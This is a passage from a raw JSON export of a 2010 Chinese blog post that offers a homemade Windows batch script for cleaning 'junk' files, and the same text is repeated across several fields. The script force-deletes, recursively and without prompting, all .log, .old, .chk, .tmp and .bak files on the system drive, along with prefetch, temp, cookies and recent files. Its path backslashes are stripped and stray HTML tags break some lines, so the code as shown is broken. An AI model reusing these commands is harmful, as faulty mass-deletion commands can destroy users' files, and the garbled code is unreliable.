/s /q %windir%*.bak<br /><br />del /f /s /q %windir%prefetch*.*<br /><br />rd /s /q %windir%temp &amp; md %windir%temp<br /><br />del /f /q %userprofile%cookies*.*<br /><br />del /f /s /q &quot;%userprofile%local settingstemporary internet files*.*&quot;<br /><br />del /f /s /q &quot;%userprofile%local settingstemp*.*&quot;<br /><br />del /f /s /q &quot;%userprofile%recent*.*&quot;<br />color 27<br />cls<br />echo ⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙<br />echo ⊙&#160;&#160; 欢迎使用由&quot;key1088&quot;制作的清除系统垃圾文件批处理小程序&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 清除系统垃圾文件批处理系统，执行完毕&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 好好学习，天天向上&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 谢谢使用!&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙ ----------------------------------------DIY:key1088------&#160;&#160; ⊙<br />echo ⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙<br />echo 5秒后自动退住<br />ping /n 5 127.0.0.1&gt;nul<br /><br /><br />复制下来，保存为.BAT 结尾的文件。。","source":"_posts/批处理清理你电脑中的垃圾.md","raw":"title: 批处理清理你电脑中的垃圾\ncategories: [Windows,操作系统]\ntags: []\ndate: 2010-04-07 19:03:00\n---\n今天朋友让我给弄个清理垃圾的软件。于是就自己DIY了个东西。也没有什么技术含量。<br /><br />代码如下：<br />@echo off<br />color a<br />mode con cols=70 lines=12 &amp;color A<br />echo ⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙<br />echo ⊙&#160;&#160; 欢迎使用由&quot;key1088&quot;制作的清除系统垃圾文件批处理小程序&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 清理垃圾文件，速度由电脑文件大小而定&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙-.-⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 请勿关闭本窗口。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙ ----------------------------------------DIY:key1088------&#160;&#160; ⊙<br />echo ⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙<br />echo 按任意键开始工作<br />pause&gt;nul<br />cls<br />RD %windir%$hf_mig$ /Q /S<br /><br />dir %windir%$NtUninstall* /a:d /b &gt;%windir%2950800.txt<br /><br />for /f %%i in (%windir%2950800.txt) do rd %windir%%%i /s /q<br /><br />del %windir%2950800.txt /f /q<br /><br />del %windir%KB*.log /f /q<br /><br />del /f /s /q %systemdrive%*.tmp<br /><br />del /f /s /q %systemdrive%*._mp<br /><br />del /f /s /q %systemdrive%*.log<br /><br />del /f /s /q %systemdrive%*.gid<br /><br />del /f /s /q %systemdrive%*.chk<br /><br />del /f /s /q %systemdrive%*.old<br /><br />del /f /s /q %systemdrive%recycled*.*<br /><br />del /f /s /q %windir%*.bak<br /><br />del /f /s /q %windir%prefetch*.*<br /><br />rd /s /q %windir%temp &amp; md %windir%temp<br /><br />del /f /q %userprofile%cookies*.*<br /><br />del /f /s /q &quot;%userprofile%local settingstemporary internet files*.*&quot;<br /><br />del /f /s /q &quot;%userprofile%local settingstemp*.*&quot;<br /><br />del /f /s /q &quot;%userprofile%recent*.*&quot;<br />color 27<br />cls<br />echo ⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙<br />echo ⊙&#160;&#160; 欢迎使用由&quot;key1088&quot;制作的清除系统垃圾文件批处理小程序&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 清除系统垃圾文件批处理系统，执行完毕&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 好好学习，天天向上&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 谢谢使用!&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙ ----------------------------------------DIY:key1088------&#160;&#160; ⊙<br />echo ⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙<br />echo 5秒后自动退住<br />ping /n 5 127.0.0.1&gt;nul<br /><br /><br />复制下来，保存为.BAT 结尾的文件。。","slug":"批处理清理你电脑中的垃圾","published":1,"updated":"2023-04-22T05:38:45.077Z","_id":"clgrjlxjx007z7opihqd6c8r2","comments":1,"layout":"post","photos":[],"link":"","content":"<p>今天朋友让我给弄个清理垃圾的软件。于是就自己DIY了个东西。也没有什么技术含量。<br /><br />代码如下：<br />@echo off<br />color a<br />mode con cols&#x3D;70 lines&#x3D;12 &amp;color A<br />echo ⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙<br />echo ⊙&amp;#160;&amp;#160; 欢迎使用由&quot;key1088&quot;制作的清除系统垃圾文件批处理小程序&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 清理垃圾文件，速度由电脑文件大小而定&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙-.-⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 请勿关闭本窗口。&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙ —————————————-DIY:key1088——&amp;#160;&amp;#160; ⊙<br />echo ⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙<br />echo 按任意键开始工作<br />pause&gt;nul<br />cls<br />RD %windir%$hf_mig$ &#x2F;Q &#x2F;S<br /><br />dir %windir%$NtUninstall* &#x2F;a:d &#x2F;b &gt;%windir%2950800.txt<br /><br />for &#x2F;f %%i in (%windir%2950800.txt) do rd %windir%%%i &#x2F;s &#x2F;q<br /><br />del %windir%2950800.txt &#x2F;f &#x2F;q<br /><br />del %windir%KB*.log &#x2F;f &#x2F;q<br /><br />del &#x2F;f &#x2F;s &#x2F;q %systemdrive%<em>.tmp<br /><br />del &#x2F;f &#x2F;s &#x2F;q %systemdrive%</em>._mp<br /><br />del &#x2F;f &#x2F;s &#x2F;q %systemdrive%<em>.log<br /><br />del &#x2F;f &#x2F;s &#x2F;q %systemdrive%</em>.gid<br /><br />del &#x2F;f &#x2F;s &#x2F;q %systemdrive%<em>.chk<br /><br />del &#x2F;f &#x2F;s &#x2F;q %systemdrive%</em>.old<br /><br />del &#x2F;f &#x2F;s &#x2F;q %systemdrive%recycled*.<em><br /><br />del &#x2F;f &#x2F;s &#x2F;q %windir%</em>.bak<br /><br />del &#x2F;f &#x2F;s &#x2F;q %windir%prefetch*.<em><br /><br />rd &#x2F;s &#x2F;q %windir%temp &amp; md %windir%temp<br /><br />del &#x2F;f &#x2F;q %userprofile%cookies</em>.<em><br /><br />del &#x2F;f &#x2F;s &#x2F;q &quot;%userprofile%local settingstemporary internet files</em>.<em>&quot;<br /><br />del &#x2F;f &#x2F;s &#x2F;q &quot;%userprofile%local settingstemp</em>.<em>&quot;<br /><br />del &#x2F;f &#x2F;s &#x2F;q &quot;%userprofile%recent</em>.*&quot;<br />color 27<br />cls<br />echo ⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙<br />echo ⊙&amp;#160;&amp;#160; 欢迎使用由&quot;key1088&quot;制作的清除系统垃圾文件批处理小程序&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 清除系统垃圾文件批处理系统，执行完毕&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 好好学习，天天向上&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 谢谢使用!&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙ —————————————-DIY:key1088——&amp;#160;&amp;#160; ⊙<br />echo ⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙<br />echo 5秒后自动退住<br />ping &#x2F;n 5 127.0.0.1&gt;nul<br /><br /><br />复制下来，保存为.BAT 结尾的文件。。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>今天朋友让我给弄个清理垃圾的软件。于是就自己DIY了个东西。也没有什么技术含量。<br /><br />代码如下：<br />@echo off<br />color a<br />mode con cols&#x3D;70 lines&#x3D;12 &amp;color A<br />echo ⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙<br />echo ⊙&amp;#160;&amp;#160; 欢迎使用由&quot;key1088&quot;制作的清除系统垃圾文件批处理小程序&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 清理垃圾文件，速度由电脑文件大小而定&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙-.-⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 请勿关闭本窗口。&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo 